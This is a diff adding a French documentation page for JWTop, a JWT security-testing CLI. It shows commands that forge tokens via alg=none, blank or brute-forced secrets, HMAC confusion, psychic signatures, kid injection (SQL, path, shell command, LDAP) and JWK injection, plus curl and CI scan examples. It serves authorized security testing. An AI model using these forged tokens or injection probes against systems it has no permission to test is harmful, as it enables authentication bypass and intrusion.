@@ -1,0 +1,209 @@
+---
+title: Tester la sécurité d'un JWT
+description: Sondez un serveur pour détecter des vulnérabilités JWT courantes et générez des tokens d'exploitation pour des tests manuels.
+---
+
+import { Aside, Tabs, TabItem, LinkCard } from '@/components/docs';
+
+JWTop propose deux outils complémentaires pour tester la sécurité des JWT : `jwtop crack` sonde automatiquement un serveur en direct, tandis que `jwtop exploit` génère des tokens modifiés pour une inspection manuelle ou des tests ciblés.
+
+<Aside type="caution">
+  N'utilisez ces outils que contre des systèmes que vous possédez ou pour lesquels vous avez une autorisation écrite explicite de test.
+</Aside>
+
+## Scan automatisé du serveur
+
+`jwtop crack` envoie une sonde pour chaque technique d'exploitation connue et rapporte celles que le serveur accepte.
+
+```sh
+jwtop crack $TOKEN --url https://api.example.com/protected
+```
+
+Exemple de sortie :
+
+```
+[+] algnone (none)              200  VULNERABLE
+[ ] algnone (NONE)              401
+[ ] algnone (None)              401
+[ ] algnone (nOnE)              401
+[ ] blanksecret                 401
+[ ] nullsig                     401
+[-] hmacconfusion               skipped (no public key provided)
+[-] psychicsig                  skipped (ECDSA-only exploit)
+[ ] kidinjection (sql)          401
+[ ] kidinjection (path)         401
+[-] jwkinjection                skipped (jwk injection not applicable for HS256)
+[-] secret                      skipped (not found in dictionary)
+```
+
+Une ligne `[+]` signifie que le serveur a accepté l'exploit. Le code de sortie `0` signifie qu'au moins un exploit a réussi ; `1` signifie qu'aucun n'a réussi.
+
+**Fournir une clé publique pour activer la sonde hmacconfusion :**
+
+```sh
+jwtop crack $TOKEN --url https://api.example.com/protected \
+  --key /path/to/public.pem
+
+jwtop crack $TOKEN --url https://api.example.com/protected \
+  --key https://example.com/public.pem
+```
+
+**Ajouter une wordlist de secrets personnalisée :**
+
+```sh
+jwtop crack $TOKEN --url https://api.example.com/protected \
+  --wordlist /path/to/secrets.txt
+```
+
+**La cible attend le JWT ailleurs que dans le header Authorization :**
+
+```sh
+# Cookie
+jwtop crack $TOKEN --url https://api.example.com/protected --token-in cookie --token-name session
+
+# Paramètre de requête
+jwtop crack $TOKEN --url https://api.example.com/protected --token-in query --token-name access_token
+
+# Corps POST encodé en formulaire
+jwtop crack $TOKEN --url https://api.example.com/protected --token-in body --token-name jwt
+```
+
+Voir la [référence de `crack`](../reference/cli/crack/#placing-the-jwt-elsewhere) pour toutes les options `--token-in`.
+
+## Tokens d'exploitation manuelle
+
+Utilisez `jwtop exploit` lorsque vous avez besoin d'un token modifié précis pour un test ciblé, un rapport, ou un cas où le serveur exige un format de requête non standard.
+
+**Contournement alg=none :**
+
+```sh
+# Une seule variante
+jwtop exploit algnone $TOKEN
+
+# Les quatre variantes de casse (une par ligne)
+jwtop exploit algnone --all $TOKEN
+```
+
+**Secret HMAC vide :**
+
+```sh
+jwtop exploit blanksecret $TOKEN
+```
+
+**Signature nulle (alg inchangé) :**
+
+```sh
+jwtop exploit nullsig $TOKEN
+```
+
+**Confusion HMAC (clé publique comme secret) :**
+
+```sh
+jwtop exploit hmacconfusion $TOKEN --key /path/to/public.pem
+jwtop exploit hmacconfusion $TOKEN --key https://example.com/public.pem
+```
+
+**Signature psychique (signature ECDSA à zéro, CVE-2022-21449) :**
+
+```sh
+jwtop exploit psychicsig $TOKEN
+```
+
+**Injection dans le header kid :**
+
+```sh
+# Variante injection SQL
+jwtop exploit kidinjection --mode sql $TOKEN
+
+# Variante path traversal
+jwtop exploit kidinjection --mode path $TOKEN
+
+# Variante injection de commande (cible les serveurs qui délèguent au shell via kid)
+jwtop exploit kidinjection --mode command $TOKEN
+jwtop exploit kidinjection --mode command --all $TOKEN  # toutes les variantes de payload shell
+
+# Variante injection LDAP (cible les serveurs qui utilisent kid dans une recherche LDAP)
+jwtop exploit kidinjection --mode ldap $TOKEN
+jwtop exploit kidinjection --mode ldap --all $TOKEN  # toutes les variantes de payload LDAP
+```
+
+**Injection de header JWK (clé auto-signée, CVE-2018-0114) :**
+
+```sh
+jwtop exploit jwkinjection $TOKEN
+jwtop exploit jwkinjection $TOKEN --alg ES256
+```
+
+**Force brute sur le secret HMAC :**
+
+```sh
+jwtop exploit weaksecret $TOKEN
+jwtop exploit weaksecret $TOKEN --wordlist /path/to/secrets.txt
+```
+
+## Utiliser des tokens d'exploitation dans des scripts
+
+Capturez la sortie et envoyez-la comme token Bearer :
+
+```sh
+EXPLOITED=$(jwtop exploit algnone $TOKEN)
+curl -si -H "Authorization: Bearer $EXPLOITED" https://api.example.com/protected \
+  | head -1
+```
+
+## Dans GitHub Actions
+
+Exécutez un scan de vulnérabilités automatiquement sur chaque pull request :
+
+<Tabs>
+  <TabItem label="cerberauth/jwtop-action">
+
+```yaml
+name: JWT security scan
+on:
+  pull_request:
+
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: cerberauth/jwtop-action@v1
+        with:
+          args: crack ${{ secrets.TEST_TOKEN }} --url ${{ vars.API_URL }}/protected
+```
+
+  </TabItem>
+  <TabItem label="CLI">
+
+```yaml
+name: JWT security scan
+on:
+  pull_request:
+
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Install jwtop
+        run: go install github.com/cerberauth/jwtop@latest
+
+      - name: Scan JWT vulnerabilities
+        run: |
+          if jwtop crack "$TOKEN" --url "$API_URL/protected"; then
+            echo "::error::JWT vulnerability detected"
+            exit 1
+          fi
+        env:
+          TOKEN: ${{ secrets.TEST_TOKEN }}
+          API_URL: ${{ vars.API_URL }}
+```
+
+  </TabItem>
+</Tabs>
+
+<LinkCard title="Guide GitHub Actions" description="Référence complète pour utiliser jwtop en CI/CD." href="../github-actions/" />
+
+## Voir aussi
+
+- [Référence de `crack`](../reference/cli/crack/)
+- [Référence de `exploit`](../reference/cli/exploit/)
